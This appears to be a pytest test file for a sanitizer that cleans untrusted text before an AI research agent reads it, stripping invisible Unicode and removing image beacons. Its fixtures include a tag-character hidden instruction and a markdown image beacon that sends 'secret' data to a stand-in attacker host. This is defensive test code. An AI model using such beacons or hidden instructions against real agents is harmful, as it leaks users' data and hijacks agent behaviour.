from __future__ import annotations

import pytest

from client_research_agent.config.settings import GuardrailSettings
from client_research_agent.security.sanitizer import ContentSanitizer, SanitizedText, decode_tag_characters


def test_nfkc_and_invisible_characters_are_removed() -> None:
    raw = "\uff21\uff43\uff4d\uff45" + chr(0x200B) + " grew" + chr(0x202E) + " revenue" + chr(0xFE0F)
    result = ContentSanitizer().sanitize_untrusted(raw)
    assert result.text == "Acme grew revenue"
    assert result.removed_counts["zero_width"] == 1
    assert result.removed_counts["bidi_controls"] == 1
    assert result.removed_counts["variation_selectors"] == 1
    assert result.removed_counts["nfkc_changed"] == 1
    assert result.modified
    assert result.original_length == len(raw)


def test_tag_characters_and_control_chars_stripped() -> None:
    hidden = "".join(chr(0xE0000 + ord(c)) for c in "obey")
    result = ContentSanitizer().sanitize_untrusted("Visible" + hidden + "\x07 text\r\nnext")
    assert result.text == "Visible text\nnext"
    assert result.removed_counts["tag_chars"] == 4
    assert result.removed_counts["control_chars"] == 1


def test_markdown_beacons_removed_and_links_unwrapped() -> None:
    raw = (
        "See ![x](https://evil.example/p.png?d=secret) and <img src='https://evil.example/a.gif'> "
        "and [the report](https://acme.example.com/report) now.\n[ref]: https://evil.example/ref"
    )
    result = ContentSanitizer().sanitize_untrusted(raw)
    assert "evil.example" not in result.text
    assert "the report" in result.text
    assert "acme.example.com" not in result.text
    assert result.removed_counts["markdown_images"] == 1
    assert result.removed_counts["html_images"] == 1
    assert result.removed_counts["markdown_links"] == 1
    assert result.removed_counts["markdown_reference_links"] == 1


def test_links_kept_when_unwrap_disabled() -> None:
    result = ContentSanitizer(unwrap_links=False).sanitize_untrusted("[a](https://x.example/b)")
    assert result.text == "[a](https://x.example/b)"


def test_whitespace_collapsed() -> None:
    result = ContentSanitizer().sanitize_untrusted("a \t  b  \n\n\n\n  c   \n")
    assert result.text == "a b\n\nc"


def test_truncation_uses_settings() -> None:
    sanitizer = ContentSanitizer.from_settings(GuardrailSettings(max_input_chars=100))
    result = sanitizer.sanitize_untrusted("word " * 100)
    assert sanitizer.max_input_chars == 100
    assert result.truncated
    assert len(result.text) <= 100
    assert result.removed_counts["truncated_chars"] > 0
    assert result.total_removed >= result.removed_counts["truncated_chars"]


def test_clean_text_unmodified_and_idempotent() -> None:
    sanitizer = ContentSanitizer()
    first = sanitizer.sanitize_untrusted("Acme reported revenue of $1.2 billion.")
    assert not first.modified
    assert sanitizer.sanitize_untrusted(first.text).text == first.text
    assert SanitizedText("x").total_removed == 0


def test_invalid_max_chars() -> None:
    with pytest.raises(ValueError, match="positive"):
        ContentSanitizer(0)


def test_decode_tag_characters_ignores_non_printable() -> None:
    assert decode_tag_characters("a" + chr(0xE0001) + chr(0xE0000 + ord("Z"))) == "Z"
